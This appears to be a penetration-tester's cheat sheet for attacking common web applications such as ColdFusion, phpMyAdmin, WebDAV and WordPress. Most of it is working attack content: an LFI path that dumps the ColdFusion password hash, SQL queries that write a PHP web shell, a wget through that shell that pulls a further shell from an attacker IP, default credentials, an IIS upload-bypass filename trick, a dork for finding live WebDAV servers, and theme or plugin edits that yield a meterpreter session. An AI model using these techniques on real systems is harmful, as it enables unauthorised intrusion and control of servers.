# Common web-services

This is a list of some common web-services. The list is alphabetical.

## Cold Fusion

If you have found a cold fusion you are almost certainly struck gold.  
[http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers](http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers)

### Determine version

example.com/CFIDE/adminapi/base.cfc?wsdl  
It will say something like:

```
<!--WSDL created by ColdFusion version 8,0,0,176276-->
```

### Version 8

#### FCKEDITOR

This works for version 8.0.1. So make sure to check the exact version.

```
use exploit/windows/http/coldfusion_fckeditor
```

#### LFI

This will output the hash of the password.

```
http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

You can pass the hash.

[http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers](http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers)

[http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/](http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/)

neo-security.xml and password.properties

## Drupal

Use droopescan \(note takes a long time!\)

```
droopescan scan drupal -u 10.10.10.9
```

## Elastix

Full of vulnerabilities. The old versions at least.

[http://example.com/vtigercrm/](http://example.com/vtigercrm/)  
default login is  
`admin:admin`

You might be able to upload shell in profile-photo.

## Joomla

## Phpmyadmin

Default credentials

```
root <blank>
pma <blank>
```

If you find a phpMyAdmin part of a site that does not have any authentication, or you have managed to bypass the authetication you can use it to upload a shell.

You go to:

```
http://192.168.1.101/phpmyadmin/
```

Then click on SQL.

```
Run SQL query/queries on server "localhost":
```

From here we can just run a sql-query that creates a php script that works as a shell

So we add the following query:

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"

# For linux
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```

The query is pretty self-explanatory. Now you just visit `192.168.1.101/shell.php?cmd=ipconfig` and you have a working web-shell.  
We can of course just write a superlong query with a better shell. But sometimes it is easier to just upload a simple web-shell, and from there download a better shell.

### Download a better shell

On linux-machines we can use wget to download a more powerful shell.

```
?cmd=wget%20192.168.1.102/shell.php
```

On windows-machines we can use tftp.

## Webdav

Okay so webdav is old as hell, and not used very often. It is pretty much like ftp. But you go through http to access it. So if you have webdav installed on a xamp-server you can access it like this:

```
cadaver 192.168.1.101/webdav
```

Then sign in with username and password.  
The default username and passwords on xamp are:

Username: **wampp**

Password: **xampp**

Then use **put** and **get** to upload and download. With this you can of course upload a shell that gives you better access.

If you are looking for live examples just google this:

```
inurl:webdav site:com
```

Test basic options

```
davtest -url http://192.168.1.101
```

Test if it is possible to upload and execute files with webdav.

```
davtest -url http://192.168.1.101 -directory demo_dir -rand aaaa_upfileP0C
```

If you managed to gain access but is unable to execute code there is a workaround for that!  
So if webdav has prohibited the user to upload .asp code, and pl and whatever, we can do this:

upload a file called shell443.txt, which of course is you .asp shell. And then you rename it to **shell443.asp;.jpg**. Now you visit the page in the browser and the asp code will run and return your shell.

### References

[http://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf](http://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf)

## Webmin

Webmin is a webgui to interact with the machine.

The password to enter is the same as the passsword for the root user, and other users if they have that right. There are several vulnerabilites for it. It is run on port 10000.

## Wordpress

If viewing the site is weird format wise. Probably due to wordpress using absolute paths instead of relatvie paths. Since hosts names are not in your /etc/hosts file yet. Add the IP and host and it should fix formatting and access to links.

### Enumeration

```
wpscan --url http://TARGEThostname -e vt,tt,u,ap --log wpscan.log

-e: enumerate
-vt: only vulnerable themes
-ap: all plugins
-tt: timthumbs
```

```
wpscan -u http://cybear32c.lab
```

If you hit a 403. That is, the request if forbidden for some reason.  
Read more here: [https://en.wikipedia.org/wiki/HTTP\_403](https://en.wikipedia.org/wiki/HTTP_403)

It could mean that the server is suspicious because you don't have a proper user-agent in your request, in wpscan you can solve this by inserting --random-agent.  
You can of course also define a specific agent if you want that. But random-agent is pretty convenient.

```
wpscan -u http://cybear32c.lab/ --random-agent
```

### Scan for users

You can use wpscan to enumerate users:

```
wpscan -u http://target --enumerate users
```

### Common Exploitation

```
WordPress Admin Access: Appearance->Editor->404 Template
Navigate to TargetIP/wordpress/wp-content/themes/[twentysixteen](name of theme)/404.php

or

if dont want to alert other CTF contestants / not break things
WordPress Admin Access: Appearance->Editor->Theme Header
paste php code after first line (<?php)
Navigate to TargetIP/anysitepagewithwordpressheader or curl
```

Note: My fav php shell is under

```
/usr/share/webshells/php/php-reverse-shell.php
```

from [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

### Alternative Exploitation

Upload plugin ability, add a malicious one using the following python script

```
https://github.com/wetw0rk/malicious-wordpress-plugin
```

Syntax:

```
python wordpwn.py AttackingIP LPORT Y
```

then

```
Add new->Upload Plugin->upload the malicious.zip-->activate plugin


Plugins-->Editor-->gotem plugin---(under edit should tell path i.e. malicious/wetw0rk_maybe.php)

then browse to the base64 encoded php file (i.e.e attack/secret/wp-content/plugins/malicious/wetw0rk_maybe.php

should generate the meterpreter session
```



